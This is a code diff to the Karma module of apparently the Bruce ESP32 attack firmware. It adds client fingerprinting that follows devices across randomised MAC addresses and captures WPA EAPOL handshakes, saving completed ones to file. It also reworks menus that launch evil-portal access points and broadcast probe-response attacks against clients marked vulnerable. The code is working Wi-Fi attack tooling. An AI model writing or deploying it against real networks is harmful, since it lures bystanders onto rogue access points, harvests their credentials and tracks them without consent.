@@ -58,8 +58,8 @@ const uint8_t karma_channels[] PROGMEM = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12,
 #define LISTEN_WINDOW 250
 #define KARMA_QUEUE_DEPTH 48
 
-enum KarmaMode { MODE_PASSIVE = 0, MODE_ACTIVE = 1, MODE_FULL = 2 };
-enum KarmaMode karmaMode = MODE_PASSIVE;
+// KarmaMode is defined in karma_attack.h, use extern here
+extern enum KarmaMode karmaMode;
 bool karmaPaused = false;
 
 // Background portal tracking - pointer vector for multiple simultaneous portals
@@ -475,7 +475,6 @@ std::map<String, uint16_t> ssidFrequency;
 std::vector<std::pair<String, uint16_t>> popularSSIDs;
 
 std::vector<PendingPortal> pendingPortals;
-std::vector<PendingPortal> activePortals;
 
 String generateUniqueFilename(FS &fs, bool compressed) {
     String basePath = "/ProbeData/";
@@ -534,7 +533,8 @@ uint32_t generateClientFingerprint(const uint8_t *frame, int len) {
         hash = ((hash << 5) + hash) + tag;
         hash = ((hash << 5) + hash) + tagLen;
         
-        for (int i = 0; i < min(4, tagLen); i++) {
+        int maxBytes = (tagLen < 4) ? tagLen : 4;
+        for (int i = 0; i < maxBytes; i++) {
             hash = ((hash << 5) + hash) + frame[pos + 2 + i];
         }
         
@@ -652,11 +652,14 @@ int classifyEAPOLMessage(const wifi_promiscuous_pkt_t *pkt) {
 }
 
 void analyzeClientBehavior(const ProbeRequest &probe) {
-    if (clientBehaviors.size() >= MAX_CLIENT_TRACK) return;
-    auto it = clientBehaviors.find(probe.mac);
+    auto it = clientBehaviors.find(probe.fingerprint);
+    
     if (it == clientBehaviors.end()) {
+        if (clientBehaviors.size() >= MAX_CLIENT_TRACK) return;
+        
         ClientBehavior behavior;
-        behavior.mac = probe.mac;
+        behavior.fingerprint = probe.fingerprint;
+        behavior.lastMAC = probe.mac;
         behavior.firstSeen = probe.timestamp;
         behavior.lastSeen = probe.timestamp;
         behavior.probeCount = 1;
@@ -665,7 +668,7 @@ void analyzeClientBehavior(const ProbeRequest &probe) {
         behavior.favoriteChannel = probe.channel;
         behavior.lastKarmaAttempt = 0;
         behavior.isVulnerable = (probe.ssid.length() > 0 && probe.ssid != "*WILDCARD*");
-        clientBehaviors[probe.mac] = behavior;
+        clientBehaviors[probe.fingerprint] = behavior;
         uniqueClients++;
     } else {
         ClientBehavior &behavior = it->second;
@@ -1509,11 +1512,20 @@ void launchManualEvilPortal(const String &ssid, uint8_t channel, bool verifyPwd)
 void handleBroadcastResponse(const String& ssid, const String& mac) {
     if (broadcastAttack.isActive()) {
         broadcastAttack.processProbeResponse(ssid, mac);
+        
+        // Use fingerprint from probe? For now, generate simple hash from MAC
+        uint32_t fingerprint = 0;
+        for (int i = 0; i < mac.length(); i++) {
+            fingerprint = ((fingerprint << 5) + fingerprint) + mac.charAt(i);
+        }
+        
         if (clientBehaviors.size() >= MAX_CLIENT_TRACK) return;
-        auto it = clientBehaviors.find(mac);
+        
+        auto it = clientBehaviors.find(fingerprint);
         if (it == clientBehaviors.end()) {
             ClientBehavior behavior;
-            behavior.mac = mac;
+            behavior.fingerprint = fingerprint;
+            behavior.lastMAC = mac;
             behavior.firstSeen = millis();
             behavior.lastSeen = millis();
             behavior.probeCount = 1;
@@ -1522,8 +1534,9 @@ void handleBroadcastResponse(const String& ssid, const String& mac) {
             behavior.favoriteChannel = pgm_read_byte(&karma_channels[channl % 14]);
             behavior.lastKarmaAttempt = 0;
             behavior.isVulnerable = true;
-            clientBehaviors[mac] = behavior;
+            clientBehaviors[fingerprint] = behavior;
             uniqueClients++;
+            
             if (karmaConfig.enableAutoKarma && pendingPortals.size() < MAX_PENDING_PORTALS) {
                 PendingPortal portal;
                 portal.ssid = ssid;
@@ -1616,13 +1629,31 @@ void probe_sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
         assocBlocked++;
     }
 
+    if (isEAPOL(pkt) && handshakeCaptureEnabled) {
+        HandshakeCapture hs;
+        memcpy(hs.bssid, frame + 16, 6);
+        hs.ssid = "UNKNOWN";
+        hs.channel = pgm_read_byte(&karma_channels[channl % 14]);
+        hs.timestamp = millis();
+        hs.frameLen = pkt->rx_ctrl.sig_len;
+        if (hs.frameLen > 256) hs.frameLen = 256;
+        memcpy(hs.eapolFrame, pkt->payload, hs.frameLen);
+        hs.complete = (classifyEAPOLMessage(pkt) == 4);
+        handshakeBuffer.push_back(hs);
+        if (handshakeBuffer.size() > 20) handshakeBuffer.erase(handshakeBuffer.begin());
+        if (hs.complete) saveHandshakeToFile(hs);
+    }
+
     if (!isProbeRequestWithSSID(pkt)) return;
 
     String mac = extractMAC(pkt);
     String ssid = extractSSID(pkt);
     if (mac.isEmpty()) return;
 
-    String cacheKey = mac + ":" + ssid;
+    // Generate client fingerprint
+    uint32_t fingerprint = generateClientFingerprint(frame, pkt->rx_ctrl.sig_len);
+    
+    String cacheKey = mac + ":" + String(fingerprint);
     if (isMACInCache(cacheKey)) return;
     addMACToCache(cacheKey);
 
@@ -1635,6 +1666,7 @@ void probe_sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
     probe.rssi = ctrl.rssi;
     probe.timestamp = millis();
     probe.channel = pgm_read_byte(&karma_channels[channl % 14]);
+    probe.fingerprint = fingerprint;
 
     if (hasRSNInfo) {
         probe.frame_len = pkt->rx_ctrl.sig_len;
@@ -1674,7 +1706,7 @@ void probe_sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
     if (broadcastAttack.isActive()) broadcastAttack.processProbeResponse(ssid, mac);
 
     if (karmaConfig.enableAutoKarma) {
-        auto it = clientBehaviors.find(probe.mac);
+        auto it = clientBehaviors.find(probe.fingerprint);
         if (it != clientBehaviors.end()) {
             ClientBehavior &client = it->second;
             uint8_t priority = calculateAttackPriority(client, probe);
@@ -1749,7 +1781,7 @@ std::vector<ProbeRequest> getUniqueProbes() {
         int idx = (start + i) % MAX_PROBE_BUFFER;
         const ProbeRequest &probe = probeBuffer[idx];
         if (probe.ssid.isEmpty() || probe.ssid == "*WILDCARD*") continue;
-        String key = probe.mac + ":" + probe.ssid;
+        String key = String(probe.fingerprint) + ":" + probe.ssid;
         if (seen.find(key) == seen.end()) {
             seen.insert(key);
             unique.push_back(probe);
@@ -1775,14 +1807,12 @@ void updateKarmaDisplay() {
     unsigned long currentTime = millis();
     if (currentTime - last_time > 1000) {
         last_time = currentTime;
-        // Clear stats area, preserve border
         tft.fillRect(10, 25, tftWidth - 20, tftHeight - 45, bruceConfig.bgColor);
         tft.setTextSize(1);
         tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
         
-        int y = 30;  // Start just below border
+        int y = 30;
         
-        // KARMA PAUSED indicator
         if (karmaPaused) {
             tft.setTextColor(TFT_RED, bruceConfig.bgColor);
             tft.setCursor(10, y);
@@ -1791,7 +1821,6 @@ void updateKarmaDisplay() {
             y += 15;
         }
         
-        // Template line
         if (templateSelected && !selectedTemplate.name.isEmpty()) {
             tft.setCursor(10, y);
             String templateText = "Template: " + selectedTemplate.name;
@@ -1800,7 +1829,6 @@ void updateKarmaDisplay() {
             y += 15;
         }
         
-        // Line 3: Total, Unique, Active, Pending
         tft.setCursor(10, y);
         tft.print("T:" + String(totalProbes));
         tft.setCursor(50, y);
@@ -1811,7 +1839,6 @@ void updateKarmaDisplay() {
         tft.print("P:" + String(pendingPortals.size()));
         y += 15;
         
-        // Line 4: Queue, Beacons, Karma, Clones
         tft.setCursor(10, y);
         tft.print("Q:" + String(responseQueue.size()));
         tft.setCursor(50, y);
@@ -1822,7 +1849,6 @@ void updateKarmaDisplay() {
         tft.print("C:" + String(cloneAttacksLaunched));
         y += 15;
         
-        // Line 5: Portals, HS, PMKID
         tft.setCursor(10, y);
         tft.print("Pt:" + String(autoPortalsLaunched) + "/" + String(activePortals.size()));
         tft.setCursor(70, y);
@@ -1831,7 +1857,6 @@ void updateKarmaDisplay() {
         tft.print("PK:" + String(pmkidCaptured));
         y += 15;
         
-        // Line 6: Channel, Hop status
         tft.setCursor(10, y);
         tft.print("Ch:" + String(pgm_read_byte(&karma_channels[channl % 14])));
         tft.setCursor(70, y);
@@ -1839,7 +1864,6 @@ void updateKarmaDisplay() {
         tft.print(hopStatus);
         y += 15;
         
-        // Line 7: Full MAC and Mode
         tft.setCursor(10, y);
         char macStr[18];
         snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
@@ -1847,27 +1871,25 @@ void updateKarmaDisplay() {
                  currentBSSID[3], currentBSSID[4], currentBSSID[5]);
         tft.print("MAC:" + String(macStr));
         
-        // Mode aligned with 4th column (under "Pend" and "Clon")
         String modeText = "";
         switch(karmaMode) {
             case MODE_PASSIVE: modeText = "PASSIVE"; break;
             case MODE_ACTIVE: modeText = "ACTIVE"; break;
             case MODE_FULL: modeText = "FULL"; break;
+            default: modeText = "PASSIVE"; break;
         }
         tft.setCursor(130, y);
         tft.print(modeText);
         y += 15;
         
-        // Line 8: Broadcast progress (if active)
         if (broadcastAttack.isActive()) {
             tft.setCursor(10, y);
             tft.print("BCast: " + broadcastAttack.getProgressString());
             y += 15;
         } else {
-            y += 15; // Keep spacing consistent
+            y += 15;
         }
         
-        // Line 9: Key hints at bottom
         tft.setCursor(10, tftHeight - 18);
         tft.print("SEL/ESC:Menu | Prev/Next:Ch");
     }
@@ -1967,7 +1989,7 @@ void karma_setup() {
 
     karmaConfig.enableAutoKarma = true;
     karmaConfig.enableDeauth = false;
-    karmaConfig.enableSmartHop = false;  // Disabled by default
+    karmaConfig.enableSmartHop = false;
     karmaConfig.prioritizeVulnerable = true;
     karmaConfig.enableAutoPortal = templateSelected;
     karmaConfig.maxClients = MAX_CLIENT_TRACK;
@@ -2052,15 +2074,25 @@ void karma_setup() {
             esp_wifi_set_promiscuous_rx_cb(probe_sniffer);
         }
         
-        if (check(PrevPress) || check(EscPress) || check(SelPress)) {
-            if (check(PrevPress)) check(PrevPress);
-            if (check(EscPress)) check(EscPress);
-            if (check(SelPress)) check(SelPress);
-            bool wasPromiscuous = false;
-            if (esp_wifi_get_promiscuous(&wasPromiscuous) == ESP_OK && wasPromiscuous)
-                esp_wifi_set_promiscuous(false);
-            bool wasActive = broadcastAttack.isActive();
-
+        if (check(PrevPress)) {
+            esp_wifi_set_promiscuous(false);
+            esp_wifi_set_promiscuous_rx_cb(nullptr);
+            if (channl == 0) channl = 13;
+            else channl--;
+            wifi_second_chan_t secondCh = (wifi_second_chan_t)NULL;
+            esp_wifi_set_channel(pgm_read_byte(&karma_channels[channl % 14]), secondCh);
+            screenNeedsRedraw = true;
+            vTaskDelay(50 / portTICK_RATE_MS);
+            esp_wifi_set_promiscuous(true);
+            esp_wifi_set_promiscuous_rx_cb(probe_sniffer);
+        }
+        
+        if (check(SelPress) || check(EscPress)) {
+            check(SelPress);
+            check(EscPress);
+            
+            vTaskDelay(200 / portTICK_PERIOD_MS);
+            
             std::vector<Option> options = {
                 {"Enhanced Stats", [&]() {
                     drawMainBorderWithTitle("ADVANCED STATS");
@@ -2099,7 +2131,6 @@ void karma_setup() {
                 
                 {"Toggle Beaconing", [&]() {
                     attackConfig.enableBeaconing = !attackConfig.enableBeaconing;
-                    // Update mode based on current states
                     if (attackConfig.enableBeaconing && broadcastAttack.isActive()) {
                         karmaMode = MODE_FULL;
                     } else if (attackConfig.enableBeaconing || broadcastAttack.isActive()) {
@@ -2129,7 +2160,7 @@ void karma_setup() {
                     std::vector<Option> karmaOptions;
                     for (const auto &client : vulnerable) {
                         if (!client.probedSSIDs.empty()) {
-                            String itemText = client.mac.substring(9) + " (VULN)";
+                            String itemText = client.lastMAC.substring(9) + " (VULN)";
                             karmaOptions.push_back({itemText.c_str(), [=, &client]() {
                                 launchManualEvilPortal(client.probedSSIDs[0], 
                                                       client.favoriteChannel, 
@@ -2198,7 +2229,6 @@ void karma_setup() {
                     broadcastOptions.push_back({broadcastAttack.isActive() ? "* Stop Broadcast" : "Start Broadcast", [&]() {
                         if (broadcastAttack.isActive()) {
                             broadcastAttack.stop();
-                            // Update mode based on current states
                             if (attackConfig.enableBeaconing) {
                                 karmaMode = MODE_ACTIVE;
                             } else {
@@ -2206,7 +2236,6 @@ void karma_setup() {
                             }
                         } else {
                             broadcastAttack.start();
-                            // Update mode based on current states
                             if (attackConfig.enableBeaconing) {
                                 karmaMode = MODE_FULL;
                             } else {
@@ -2345,12 +2374,6 @@ void karma_setup() {
                 {"Exit Karma", [&]() { returnToMenu = true; }},
             };
             loopOptions(options);
-
-            if (wasActive && !broadcastAttack.isActive() && !returnToMenu) broadcastAttack.start();
-            if (wasPromiscuous && !returnToMenu) {
-                esp_wifi_set_promiscuous(true);
-                esp_wifi_set_promiscuous_rx_cb(probe_sniffer);
-            }
             screenNeedsRedraw = true;
             continue;
         }
